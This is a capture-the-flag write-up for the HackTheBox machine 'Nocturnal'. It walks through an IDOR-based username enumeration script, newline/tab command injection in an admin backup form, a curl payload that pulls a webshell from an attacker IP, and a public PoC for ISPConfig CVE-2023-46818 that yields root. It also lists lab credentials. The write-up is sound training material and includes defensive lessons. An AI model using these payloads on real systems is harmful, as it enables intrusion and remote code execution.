---
title: "Nocturnal"
date: 2025-05-03
type: docs
tags:
  - htb
  - linux
  - easy
  - idor
  - user-enumeration
  - command-injection
  - env-file
  - hashcat
  - ispconfig
  - cve-2023-46818
  - php-code-injection
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Easy, **Released:** 2025-05-03, **IP:** `10.10.11.64` → `nocturnal.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Register on the site; `view.php?username=X&file=Y` is an **IDOR**. You can read other users' uploaded files.
2. The `File does not exist.` vs no-response difference is a **username oracle**. Script it → `admin`, `amanda`. `amanda`'s stored file leaks a temp password `arHkG7HAI68X8s1J` ("set for all our services").
3. Log in as `amanda` → admin panel → the "backup" feature passes `password` into a shell command → **command injection** (`%0Abash …`) → shell as `www-data`.
4. Read `.env` for DB creds; the SQLite/MySQL DB has `tobias`'s hash → crack → SSH as **`tobias`**.
5. Internal **ISPConfig 3.2.x** on `:8080`, vulnerable to **CVE-2023-46818** (PHP code injection in the language editor as `admin`) → root.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| `amanda` (leaked temp password) | `arHkG7HAI68X8s1J` |
| `tobias` (cracked DB hash) | see note (public writeups: `slowmotionapocalypse`) |
| ISPConfig `admin` | reuse `amanda`'s password |
| `user.txt` | `/home/tobias/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Nocturnal is a chain of **broken access control** primitives: an **IDOR** that leaks files, an **error-message oracle** that turns the IDOR into user enumeration, a plaintext credential in a leaked file, a **command injection** in an admin function, credentials in a `.env`, an offline **hash crack**, and finally an **N-day** in an internal ISPConfig. Every step is "the app trusts something it shouldn't". It's a great box for building the habit of scripting an oracle rather than guessing.

Related IDOR boxes: [Drive](/writeups/hackthebox/linux/hard/drive/), [Road](/writeups/tryhackme/linux/easy/road/). Related username oracles: [Dog](/writeups/hackthebox/linux/easy/dog/), [Previse](/writeups/hackthebox/linux/easy/previse/). Related `.env` / DB-hash-crack: [Cat](/writeups/hackthebox/linux/medium/cat/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/). Related internal-service N-day → root: [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Monitored](/writeups/hackthebox/linux/medium/monitored/).

---

## Full Walkthrough

### Nmap scan

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-enum:
|_  /login.php: Possible admin folder
```

(SSH/nginx `vulners` dumps trimmed.)

### IDOR → username oracle

once I registered for an account I tried to upload a file (there was an upload function), tried to bypass it and found a way in, but it would not directly execute the payload. One thing stood out though:

```
http://nocturnal.htb/view.php?username=baphomet&file=rev.pdf
```

<div class="callout callout-note">

**IDOR → enumeration**

`view.php` takes `username` **and** `file` as parameters and does no ownership check. That's an Insecure Direct Object Reference. It also returns a *different* body for "user exists, file missing" (`File does not exist.`) vs "user doesn't exist" (redirect / empty). That difference is a **username oracle**: iterate a username wordlist, keep the ones that return `File does not exist.`.

</div>

so I researched `nocturnal user enumeration` and found a script:

```python
#!/usr/bin/python3
from pwn import *
import requests, signal, sys

wordlist = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
cookie = sys.argv[1]
found = []
for username in open(wordlist):
    username = username.strip()
    r = requests.get(f"http://nocturnal.htb/view.php?username={username}&file=pwn.xlsx",
                     cookies={'PHPSESSID': cookie})
    if "File does not exist." in r.text:
        found.append(username); print(found)
    sleep(0.5)
```

Found two users: `admin`, `amanda`. `amanda` has a downloadable file:

```
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J.
This password has been set for all our services...
```

### Command injection in the admin "backup"

Log in as `amanda`, open the admin panel, use the "backup" feature (set a password on the archive). The `password` field is passed straight to a shell:

```http
POST /admin.php HTTP/1.1
Host: nocturnal.htb
Cookie: PHPSESSID=jan6orq2ilehsuu1ebbal3trrq
Content-Type: application/x-www-form-urlencoded

password=%0Abash-c%09"id"&backup=
```

<div class="callout callout-note">

**Newline + tab injection**

The backend builds something like `zip -P <password> backup.zip..`. It filters spaces and `;`/`|`/`&`, but **not `%0A` (newline)**. Which terminates the current command. And uses **`%09` (tab)** as the argument separator. `password=%0Abash-c%09"curl%09http://10.10.14.205:8000/rev.php%09-o%09rev.php"&backup=` downloads a webshell into the webroot; a second request runs `bash rev.php`. Classic "the blacklist forgot whitespace variants".

</div>

```http
password=%0Abash-c%09"curl%09http://10.10.14.205:8000/rev.php%09-o%09rev.php"&backup=
```

Shell as `www-data`.

<div class="callout callout-note">

**Beyond the recorded notes, Www-data → tobias → root**

The operator's notes stop at the ISPConfig fingerprint. The rest:

**1. `.env` → DB → crack.** `/var/www/nocturnal_database/nocturnal_database.db` (SQLite) or the app's `.env` gives DB access; the `users` table has `tobias`'s hash. Crack with `hashcat -m 0`. Public writeups record `slowmotionapocalypse`.
```bash
ssh tobias@nocturnal.htb
```

**2. ISPConfig CVE-2023-46818.** An internal panel runs on `:8080`; forward it:
```bash
ssh -L 8081:localhost:8080 tobias@nocturnal.htb
```
Log in as `admin` with **amanda's** password (`arHkG7HAI68X8s1J`). ISPConfig ≤ 3.2.11 lets the built-in `admin` inject PHP through the **language file editor** (`records`/`lang` parameters not sanitised, `eval`'d). Public PoC:
```bash
python3 CVE-2023-46818.py http://localhost:8081/ admin arHkG7HAI68X8s1J
ISPConfig> cat /root/root.txt
```
ISPConfig's web process runs as root here, so the injected PHP is root.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/tobias/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons & Takeaways

- **Enforce object ownership** on every `view`/`download`/`edit` endpoint. Never trust an ID/username from the client.
- **Don't leak existence** through differential responses; return identical output for "missing" and "unauthorised".
- **Never build shell commands by concatenation.** Use `execve`-style arg arrays; if you must shell out, allowlist and reject all whitespace/metacharacters, not a subset.
- **`.env` files are gold**. Keep them outside the web root and off world-readable perms.
- **Patch internal apps too.** "It's only on localhost" fails the moment someone has a shell.
- **Shared temp passwords across all services** is the exact anti-pattern the amanda letter describes.

---

## Related Writeups

- **IDOR / broken access control:** [Drive](/writeups/hackthebox/linux/hard/drive/), [Road](/writeups/tryhackme/linux/easy/road/)
- **Username / existence oracles:** [Dog](/writeups/hackthebox/linux/easy/dog/), [Previse](/writeups/hackthebox/linux/easy/previse/)
- **Command injection via missing whitespace filter:** [Previse](/writeups/hackthebox/linux/easy/previse/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Headless](/writeups/hackthebox/linux/medium/headless/)
- **`.env` → DB hash → crack:** [Cat](/writeups/hackthebox/linux/medium/cat/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)
- **Internal N-day → root:** [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Monitored](/writeups/hackthebox/linux/medium/monitored/)

## References

- CVE-2023-46818 (ISPConfig) <https://nvd.nist.gov/vuln/detail/CVE-2023-46818>
- ISPConfig advisory <https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/>
- OWASP IDOR <https://owasp.org/www-project-web-security-testing-guide/>
